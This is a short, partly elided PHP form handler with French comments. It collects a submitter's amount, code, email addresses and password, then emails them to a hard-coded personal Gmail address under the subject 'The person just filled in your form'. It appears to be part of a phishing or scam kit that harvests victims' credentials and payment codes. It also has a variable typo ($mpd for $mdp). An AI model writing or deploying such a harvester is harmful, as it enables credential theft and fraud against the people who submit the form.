...
if (get_magic_quotes_gpc())
{
 ...
 $montant = stripslashes(trim($_POST['montant']));
 $mail = stripslashes(trim($_POST['mail']));    
 $mail2 = stripslashes(trim($_POST['mail2']));
 $code = stripslashes(trim($_POST['code']));
 $mdp = stripslashes(trim($_POST['mdp']));
}     
else      
{
  $type = stripslashes(trim($_POST['type']));
...
/*Le destinataire*/
$to="ghislainfibi96@gmail.com";

/*Le sujet du message qui apparaitra*/
$sujet="La personne vient de remplir ton formulaire";
$msg = '';
...
$msg .= 'son adresse : '.$mail."rnrn";
$msg .= 'son adresse : '.$mail2."rnrn";
$msg .= 'Son mot de passe : '.$mpd."rnrn";
